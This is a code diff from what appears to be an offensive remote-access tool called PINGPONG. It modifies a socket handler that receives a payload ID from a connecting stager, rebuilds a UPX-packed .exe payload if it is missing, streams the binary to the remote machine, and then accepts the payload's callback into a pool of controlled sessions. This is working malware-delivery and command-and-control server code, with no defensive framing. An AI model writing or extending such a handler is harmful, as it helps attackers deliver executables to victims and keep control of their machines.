@@ -74,43 +74,56 @@ def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True
 			main.main()
 		_basic_ip = addr[0]
 		conn.send(b'OK')
-		len_id = conn.recv(1024).decode('utf8')
+		_type = conn.recv(1024).decode('utf8')
 		conn.send(b'OK')
-		payload_id = conn.recv(int(len_id)).decode('utf8')
-		_payload_id_with_exe = payload_id + '.exe'
-		if os.path.isfile(f'./payload/upload_payload/{_payload_id_with_exe}'):
+		if _type == 'basic_conn':
+			len_id = conn.recv(1024).decode('utf8')
 			conn.send(b'OK')
-			with open(f'./payload/upload_payload/{_payload_id_with_exe}', 'rb') as f:
-				se_data = f.read()
-				main.print_normal(f'handler>[*]Sending bytes ({len(se_data)} bytes) to {_basic_ip}')
-				conn.send(bytes(str(len(se_data)), 'utf8'))
-				conn.recv(1024)
-				conn.send(se_data)
-				conn.close()
-				s.close()
-				break
-		else:
-			conn.send(b'wait')
-			main.print_error('handler>[-]The payload is missing!')
-			main.print_normal('handler>[*]Makeing it again, using the current settings......')
-			upx_dir = input("handler>[*]Please input the upx_dir>")
-			payload.payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe', is_ask=False, is_ask_ip=ip, is_ask_port=port, is_basic_payload=True, _payload_id=payload_id, is_return_main=False)
-			conn.send(b'OK')
-			with open(f'./payload/upload_payload/{_payload_id_with_exe}', 'rb') as f:
-				se_data = f.read()
-				main.print_normal(f'handler>[*]Sending bytes ({len(se_data)} bytes) to {_basic_ip}')
-				conn.send(bytes(str(len(se_data)), 'utf8'))
-				conn.recv(1024)
-				conn.send(se_data)
-				conn.close()
-				s.close()
-				break
-	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-	s.bind((ip, port))
-	s.listen(10)
+			payload_id = conn.recv(int(len_id)).decode('utf8')
+			_payload_id_with_exe = payload_id + '.exe'
+			if os.path.isfile(f'./payload/upload_payload/{_payload_id_with_exe}'):
+				conn.send(b'OK')
+				with open(f'./payload/upload_payload/{_payload_id_with_exe}', 'rb') as f:
+					se_data = f.read()
+					main.print_normal(f'handler>[*]Sending bytes ({len(se_data)} bytes) to {_basic_ip}')
+					conn.send(bytes(str(len(se_data)), 'utf8'))
+					conn.recv(1024)
+					conn.send(se_data)
+					conn.close()
+					s.close()
+					_start(ip, port, printf, True)
+					break
+			else:
+				conn.send(b'wait')
+				main.print_error('handler>[-]The payload is missing!')
+				main.print_normal('handler>[*]Makeing it again, using the current settings......')
+				upx_dir = input("handler>[*]Please input the upx_dir>")
+				payload.payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir, '.exe', is_ask=False, is_ask_ip=ip, is_ask_port=port, is_basic_payload=True, _payload_id=payload_id, is_return_main=False)
+				conn.send(b'OK')
+				with open(f'./payload/upload_payload/{_payload_id_with_exe}', 'rb') as f:
+					se_data = f.read()
+					main.print_normal(f'handler>[*]Sending bytes ({len(se_data)} bytes) to {_basic_ip}')
+					conn.send(bytes(str(len(se_data)), 'utf8'))
+					conn.recv(1024)
+					conn.send(se_data)
+					conn.close()
+					s.close()
+					_start(ip, port, printf, True)
+					break
+		elif _type == 'PAYLOAD':
+			_start(ip, port, printf, False, conn=conn, addr=addr)
+			break
+
+def _start(ip, port, printf, is_recv, conn='', addr=''):
+	if is_recv:
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+		s.bind((ip, port))
+		s.listen(10)
 	while True:
-		conn, addr = s.accept()
+		if is_recv:
+			conn, addr = s.accept()
+			conn.recv(1024)
 		_ip = addr[0]
 		_port = addr[1]
 		connect_pool.append([conn, ip, port, _ip, _port, 'PINGPONG session'])
